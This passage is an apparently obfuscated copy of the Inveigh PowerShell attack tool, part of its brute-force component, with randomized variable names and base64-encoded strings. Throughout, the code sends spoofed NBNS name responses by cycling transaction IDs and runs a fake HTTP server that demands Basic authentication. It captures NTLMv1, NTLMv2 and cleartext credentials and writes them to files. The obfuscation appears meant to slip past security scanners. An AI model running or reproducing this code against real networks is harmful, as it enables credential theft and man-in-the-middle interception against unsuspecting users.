        {
            ${116d6a8612cc4f38bb9ce9bc2a3059a4} = [System.Text.Encoding]::UTF8.GetBytes("Basic realm=${dc62541d5d8f462b9742ff6c2fe5ec35}")
            ${8947430ab9de464a96b5af36bc75b141} = (0x0d,0x0a)
            ${2afcb53cd1664ab89f755ef5e8fd9449} = [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d}.Length)
            ${8947430ab9de464a96b5af36bc75b141} += [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d})
            ${73119a454e2b41c1b9dcb29ba1555e6a} = $true
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + ${8d702e270d9d413fbd0f4bc6c8ab1bd3}`
                + (0x20)`
                + ${a67496760e384b69bc5d1d060d8aa20c}`
                + (0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + ${9b2aa225f1fa4821bc9be1847c3130fb}`
                + (0x0d,0x0a)`
                + ${28c5eaa66d9e494187440f73fc0cfd28}`
                + ${116d6a8612cc4f38bb9ce9bc2a3059a4}`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20)`
                + ${2afcb53cd1664ab89f755ef5e8fd9449}`
                + (0x0d,0x0a)`
                + ${8947430ab9de464a96b5af36bc75b141} 
        }
        else
        {
            ${8d702e270d9d413fbd0f4bc6c8ab1bd3} = (0x32,0x30,0x30)
            ${a67496760e384b69bc5d1d060d8aa20c} = (0x4f,0x4b)
            ${8947430ab9de464a96b5af36bc75b141} = (0x0d,0x0a)
            ${2afcb53cd1664ab89f755ef5e8fd9449} = [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d}.Length)
            ${8947430ab9de464a96b5af36bc75b141} += [System.Text.Encoding]::UTF8.GetBytes(${de6094eb15be4d9ebb56241d78e0cc6d})
            ${73119a454e2b41c1b9dcb29ba1555e6a} = $true
            [Byte[]] $HTTP_response = (0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20)`
                + ${8d702e270d9d413fbd0f4bc6c8ab1bd3}`
                + (0x20)`
                + ${a67496760e384b69bc5d1d060d8aa20c}`
                + (0x0d,0x0a)`
                + (0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a)`
                + (0x44,0x61,0x74,0x65,0x3a)`
                + ${9b2aa225f1fa4821bc9be1847c3130fb}`
                + (0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20,0x74,0x65,0x78,0x74,0x2f,0x68,0x74,0x6d,0x6c,0x3b,0x20,0x63,0x68,0x61,0x72,0x73,0x65,0x74,0x3d,0x75,0x74,0x66,0x2d,0x38,0x0d,0x0a)`
                + (0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20)`
                + ${2afcb53cd1664ab89f755ef5e8fd9449}`
                + (0x0d,0x0a)`
                + ${8947430ab9de464a96b5af36bc75b141} 
        }
        ${ad9d55edfa5d41b0a09076e3cf816569}.write($HTTP_response, 0, $HTTP_response.length)
        ${ad9d55edfa5d41b0a09076e3cf816569}.Flush()
        start-sleep -m 10
        ${6bd93b49652547aa8dce78119322c001} = ${ede05207b489488bba633abba9b66f6c}
        ${4f1bdb3d4d50470cae69ebac10b52793}= ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Client.Handle
        if(${73119a454e2b41c1b9dcb29ba1555e6a})
        {
            ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_client.Close()
            if(${a4bfbe1821f142c7a8809093cf8457c1} -gt 0 -and (${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list.Count -ge ${6a64531fc8744c37ad38ed3c3761f0fe} -or ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list.Count -ge ${7c0c3fda91b94a11a56b363a35f6961f} -or ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list.Count -ge ${1c92af7260524875b5331fc09cb6af33}))
            {
                HTTPListenerStop
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("Inveigh Brute Force exited due to run count at $(Get-Date -format 's')")
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Brute Force exited due to run count")])
                ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running = $false
            }
        }
        ${73119a454e2b41c1b9dcb29ba1555e6a} = $false
    }
}
${da26d322d2064526b7e05191b3406c7f} = 
{
    param (${d3d9252b81b34c83866f68fa0030627b},${a3dcb3194a2c4929a7bf0ab79aa13e81},${dd1c2678b4764d0296fd04fcfa03a041},${ae8cde04bacd42438e1eccc463a80909},${c313e4e0c5fa4fdca786cffb25afe4d4})
    ${a3dcb3194a2c4929a7bf0ab79aa13e81} = ${a3dcb3194a2c4929a7bf0ab79aa13e81}.ToUpper()
    [Byte[]]${21f4648ca4c24a209e3c1d6307e91692} = (0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x43,0x41,0x41,0x41,0x00)
    ${535f44c3383142de85ccba5974a9189a} = [System.Text.Encoding]::UTF8.GetBytes(${a3dcb3194a2c4929a7bf0ab79aa13e81})
    ${535f44c3383142de85ccba5974a9189a} = [System.BitConverter]::ToString(${535f44c3383142de85ccba5974a9189a})
    ${535f44c3383142de85ccba5974a9189a} = ${535f44c3383142de85ccba5974a9189a}.Replace("-","")
    ${535f44c3383142de85ccba5974a9189a} = [System.Text.Encoding]::UTF8.GetBytes(${535f44c3383142de85ccba5974a9189a})
    ${8cc285ba866b4dd6b85f6a8adc76ae52} = [BitConverter]::GetBytes(${c313e4e0c5fa4fdca786cffb25afe4d4})
    [array]::Reverse(${8cc285ba866b4dd6b85f6a8adc76ae52})
    for (${46b80a31e8a74499bdec2ae57a88c331}=0; ${46b80a31e8a74499bdec2ae57a88c331} -lt ${535f44c3383142de85ccba5974a9189a}.Count; ${46b80a31e8a74499bdec2ae57a88c331}++)
    {
        if(${535f44c3383142de85ccba5974a9189a}[${46b80a31e8a74499bdec2ae57a88c331}] -gt 64)
        {
            ${21f4648ca4c24a209e3c1d6307e91692}[${46b80a31e8a74499bdec2ae57a88c331}] = ${535f44c3383142de85ccba5974a9189a}[${46b80a31e8a74499bdec2ae57a88c331}] + 10
        }
        else
        {
            ${21f4648ca4c24a209e3c1d6307e91692}[${46b80a31e8a74499bdec2ae57a88c331}] = ${535f44c3383142de85ccba5974a9189a}[${46b80a31e8a74499bdec2ae57a88c331}] + 17
        }
    }
    [Byte[]]${c3e8c5f28faf4046a9c0b4c32ce76c6b} = (0x00,0x00)`
        + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
        + ${21f4648ca4c24a209e3c1d6307e91692}`
        + (0x00,0x20,0x00,0x01)`
        + ${8cc285ba866b4dd6b85f6a8adc76ae52}`
        + (0x00,0x06,0x00,0x00)`
        + ([IPAddress][String]([IPAddress]${d3d9252b81b34c83866f68fa0030627b})).GetAddressBytes()`
        + (0x00,0x00,0x00,0x00)
    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve ${a3dcb3194a2c4929a7bf0ab79aa13e81} on ${dd1c2678b4764d0296fd04fcfa03a041}")
    ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Starting NBNS brute force spoofer to resolve ${a3dcb3194a2c4929a7bf0ab79aa13e81} on ${dd1c2678b4764d0296fd04fcfa03a041}")])
    ${d3db683a70d74803b922689ae53b3bde} = $false
    ${29a440d568d14b97b5bee22bdba0a5e5} = New-Object System.Net.Sockets.UdpClient(137)
    ${a8876042dffe4798aa0594ef4ea93106} = [system.net.IPAddress]::Parse(${dd1c2678b4764d0296fd04fcfa03a041})
    ${8d9c5c5b56744d75aeab2b805bddb61c} = New-Object Net.IPEndpoint(${a8876042dffe4798aa0594ef4ea93106},137)
    ${29a440d568d14b97b5bee22bdba0a5e5}.Connect(${8d9c5c5b56744d75aeab2b805bddb61c})
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
    {
        :NBNS_spoofer_loop while (!${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof -and ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
        {
            if(${d3db683a70d74803b922689ae53b3bde})
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Resuming NBNS brute force spoofer")])
                ${d3db683a70d74803b922689ae53b3bde} = $false
            }
            for (${46b80a31e8a74499bdec2ae57a88c331} = 0; ${46b80a31e8a74499bdec2ae57a88c331} -lt 255; ${46b80a31e8a74499bdec2ae57a88c331}++)
            {
                for (${27b0ddf1a1394eb6abaebb5b2c984ba8} = 0; ${27b0ddf1a1394eb6abaebb5b2c984ba8} -lt 255; ${27b0ddf1a1394eb6abaebb5b2c984ba8}++)
                {
                    ${c3e8c5f28faf4046a9c0b4c32ce76c6b}[0] = ${46b80a31e8a74499bdec2ae57a88c331}
                    ${c3e8c5f28faf4046a9c0b4c32ce76c6b}[1] = ${27b0ddf1a1394eb6abaebb5b2c984ba8}                 
                    [void]${29a440d568d14b97b5bee22bdba0a5e5}.send( ${c3e8c5f28faf4046a9c0b4c32ce76c6b},${c3e8c5f28faf4046a9c0b4c32ce76c6b}.length)
                    if(${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof -and ${ae8cde04bacd42438e1eccc463a80909})
                    {
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Pausing NBNS brute force spoofer")])
                        ${d3db683a70d74803b922689ae53b3bde} = $true
                        break NBNS_spoofer_loop
                    }
                }
            }
        }
        sleep -m 5
    }
    ${29a440d568d14b97b5bee22bdba0a5e5}.Close()
 }
${f214bf4334d448f9bf2b74e1deb9edb6} = 
{
    param (${ae8cde04bacd42438e1eccc463a80909},${b4f82f5a600f474c9e8d13dd26e298cd})
    if(${b4f82f5a600f474c9e8d13dd26e298cd})
    {    
        ${f800d11332194045b417abfd1e345544} = new-timespan -Minutes ${b4f82f5a600f474c9e8d13dd26e298cd}
        ${7589cf25308b45ac82d8000b0c650519} = [diagnostics.stopwatch]::StartNew()
    }
    if(${ae8cde04bacd42438e1eccc463a80909})
    {   
        ${4c7f9c29e46943e8bdf4f173ab49c588} = new-timespan -Seconds ${ae8cde04bacd42438e1eccc463a80909}
    }
    while (${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
    {
        if(${b4f82f5a600f474c9e8d13dd26e298cd})
        {    
            if(${7589cf25308b45ac82d8000b0c650519}.elapsed -ge ${f800d11332194045b417abfd1e345544})
            {
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.IsListening)
                {
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Stop()
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Close()
                }
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
                {
                    HTTPListenerStop
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("Inveigh Brute Force exited due to run time at $(Get-Date -format 's')")
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Brute Force exited due to run time")])
                    sleep -m 5
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running = $false
                }
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running)
                {
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("Inveigh Relay exited due to run time at $(Get-Date -format 's')")
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay exited due to run time")])
                    sleep -m 5
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running = $false
                } 
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.running)
                {
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.add("Inveigh exited due to run time at $(Get-Date -format 's')")
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.add("$(Get-Date -format 's') - Inveigh exited due to run time")])
                    sleep -m 5
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.running = $false
                } 
            }
        }
        if(${ae8cde04bacd42438e1eccc463a80909} -and ${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof)
        {    
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.NBNS_stopwatch.elapsed -ge ${4c7f9c29e46943e8bdf4f173ab49c588})
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.hostname_spoof = $false
            }
        }
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output -and !${5caffc5f8dd440f7b05ff021bfd90d19}.running)
        {
            while(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.Count -gt 0)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.RemoveRange(0,1)
            }
            while(${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue.Count -gt 0)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_out_file -Append
                ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue.RemoveRange(0,1)
            }
            while(${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue.Count -gt 0)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_out_file -Append
                ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue.RemoveRange(0,1)
            }
            while(${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue.Count -gt 0)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_out_file -Append
                ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue.RemoveRange(0,1)
            }
        }
        sleep -m 5
    }
 }
Function HTTPListener()
{
    if(${cf2af60e5f0b4eae8c8234df7276108b})
    {
        ${cf2af60e5f0b4eae8c8234df7276108b} = [system.net.IPAddress]::Parse(${cf2af60e5f0b4eae8c8234df7276108b})
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_endpoint = New-Object System.Net.IPEndPoint(${cf2af60e5f0b4eae8c8234df7276108b},${bcb236e03d5f437b8efec36f6a5c7044})
    }
    else
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_endpoint = New-Object System.Net.IPEndPoint([ipaddress]::any,${bcb236e03d5f437b8efec36f6a5c7044})
    }
    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener = New-Object System.Net.Sockets.TcpListener ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_endpoint
    ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Start()
    ${4dcb1ead83814b3b82677c3df6bc0602} = [runspacefactory]::CreateRunspace()
    ${4dcb1ead83814b3b82677c3df6bc0602}.Open()
    ${4dcb1ead83814b3b82677c3df6bc0602}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${5caffc5f8dd440f7b05ff021bfd90d19})
    ${d6fb814e28704b87867bdc6e541a318a} = [powershell]::Create()
    ${d6fb814e28704b87867bdc6e541a318a}.Runspace = ${4dcb1ead83814b3b82677c3df6bc0602}
    ${d6fb814e28704b87867bdc6e541a318a}.AddScript(${0a2170e8c68e47e4b337d5e21a4de14b}) > $null
    ${d6fb814e28704b87867bdc6e541a318a}.AddScript(${3e2bf58e2ebd4c4b8e7bdecd2c121915}).AddArgument(${a82319c2a58b4b90a87c560c5727045b}).AddArgument(${dc62541d5d8f462b9742ff6c2fe5ec35}).AddArgument(${b99aeade7d42477bb7323da939ca37f5}).AddArgument(
        ${e3c1295ac79b4a898e098e5001c625e5}).AddArgument(${ae8cde04bacd42438e1eccc463a80909}).AddArgument(${bbb4484245104b1da9fa046aab15160c}).AddArgument(${b9c6da06dea3463fb4e2486eb58b33a2}).AddArgument(${c358d7f99b2f421e9b8ba501c0c3c61f}).AddArgument(
        ${e0eb5e5670484d639477e9049011be55}).AddArgument(${cab2ad2fb4c84cc6bc2dab829c3c3bbd}).AddArgument(${a4bfbe1821f142c7a8809093cf8457c1}) > $null
    ${d6fb814e28704b87867bdc6e541a318a}.BeginInvoke() > $null
}
Function Spoofer()
{
    ${d93c7abc99b64bc994a7bde420607e2a} = [runspacefactory]::CreateRunspace()
    ${d93c7abc99b64bc994a7bde420607e2a}.Open()
    ${d93c7abc99b64bc994a7bde420607e2a}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${5caffc5f8dd440f7b05ff021bfd90d19})
    ${3a7d54248943470a9bec55c45c11e99c} = [powershell]::Create()
    ${3a7d54248943470a9bec55c45c11e99c}.Runspace = ${d93c7abc99b64bc994a7bde420607e2a}
    ${3a7d54248943470a9bec55c45c11e99c}.AddScript(${0a2170e8c68e47e4b337d5e21a4de14b}) > $null
    ${3a7d54248943470a9bec55c45c11e99c}.AddScript($SMB_NTLM_functions_scriptblock) > $null
    ${3a7d54248943470a9bec55c45c11e99c}.AddScript(${da26d322d2064526b7e05191b3406c7f}).AddArgument(${d3d9252b81b34c83866f68fa0030627b}).AddArgument(${a3dcb3194a2c4929a7bf0ab79aa13e81}).AddArgument(
        ${dd1c2678b4764d0296fd04fcfa03a041}).AddArgument(${ae8cde04bacd42438e1eccc463a80909}).AddArgument(${c313e4e0c5fa4fdca786cffb25afe4d4}) > $null
    ${3a7d54248943470a9bec55c45c11e99c}.BeginInvoke() > $null
}
Function ControlBruteForceLoop()
{
    ${be6978935cca49f19dd86991ac8ccb3c} = [runspacefactory]::CreateRunspace()
    ${be6978935cca49f19dd86991ac8ccb3c}.Open()
    ${be6978935cca49f19dd86991ac8ccb3c}.SessionStateProxy.SetVariable($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHYAZQBpAGcAaAA='))),${5caffc5f8dd440f7b05ff021bfd90d19})
    ${e5855b0cabf1451686c85b9d09830061} = [powershell]::Create()
    ${e5855b0cabf1451686c85b9d09830061}.Runspace = ${be6978935cca49f19dd86991ac8ccb3c}
    ${e5855b0cabf1451686c85b9d09830061}.AddScript(${0a2170e8c68e47e4b337d5e21a4de14b}) > $null
    ${e5855b0cabf1451686c85b9d09830061}.AddScript(${f214bf4334d448f9bf2b74e1deb9edb6}).AddArgument(${ae8cde04bacd42438e1eccc463a80909}).AddArgument(${b4f82f5a600f474c9e8d13dd26e298cd}) > $null
    ${e5855b0cabf1451686c85b9d09830061}.BeginInvoke() > $null
}
if(${c87a3196a1a84c82a4927bb666567de5} -eq 'y')
{
    HTTPListener
}
if(${b6833b506b8043e88d9b8151a7cef328} -eq 'y')
{
    Spoofer
}
if(${ae8cde04bacd42438e1eccc463a80909} -or ${b4f82f5a600f474c9e8d13dd26e298cd} -or ${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
{
    ControlBruteForceLoop
}
if(${5caffc5f8dd440f7b05ff021bfd90d19}.console_output)
{
    :console_loop while((${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running -and ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output) -or (${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.Count -gt 0 -and ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output))
    {
        while(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.Count -gt 0)
        {
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only)
            {
                write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0] + ${5caffc5f8dd440f7b05ff021bfd90d19}.newline)
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                    {
                        if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                        {
                            write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        }
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.console_input)
        {
            if([console]::KeyAvailable)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output = $false
                BREAK console_loop
            }
        }
        sleep -m 5
    }
}
if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output -and !${5caffc5f8dd440f7b05ff021bfd90d19}.running)
{
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.Count -gt 0)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append
        ${5caffc5f8dd440f7b05ff021bfd90d19}.log_file_queue.RemoveRange(0,1)
    }
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue.Count -gt 0)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_out_file -Append
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_file_queue.RemoveRange(0,1)
    }
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue.Count -gt 0)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_out_file -Append
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_file_queue.RemoveRange(0,1)
    }
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue.Count -gt 0)
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue[0]|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_out_file -Append
        ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_file_queue.RemoveRange(0,1)
    }
}
}
Function Stop-Inveigh
{
    if(${5caffc5f8dd440f7b05ff021bfd90d19})
    {
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
        {
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.IsListening)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Stop()
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Close()
            }
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running = $false
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("$(Get-Date -format 's') - Attempting to stop HTTP listener")|Out-Null
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.server.blocking = $false
                sleep -s 1
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.server.Close()
                sleep -s 1
                ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP_listener.Stop()
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Inveigh Brute Force exited at $(Get-Date -format 's')")|Out-Null
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add("$(Get-Date -format 's') - Inveigh Brute Force exited")|Out-Null
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Brute Force exited"| Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append
                }
            }
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running = $false
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Inveigh Relay exited at $(Get-Date -format 's')")|Out-Null
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add("$(Get-Date -format 's') - Inveigh Relay exited")|Out-Null
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh Relay exited"| Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append
                }
            } 
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.running)
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.running = $false
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add("Inveigh exited at $(Get-Date -format 's')")|Out-Null
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add("$(Get-Date -format 's') - Inveigh exited")|Out-Null
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                {
                    "$(Get-Date -format 's') - Inveigh exited"| Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append
                }
            } 
        }
        else
        {
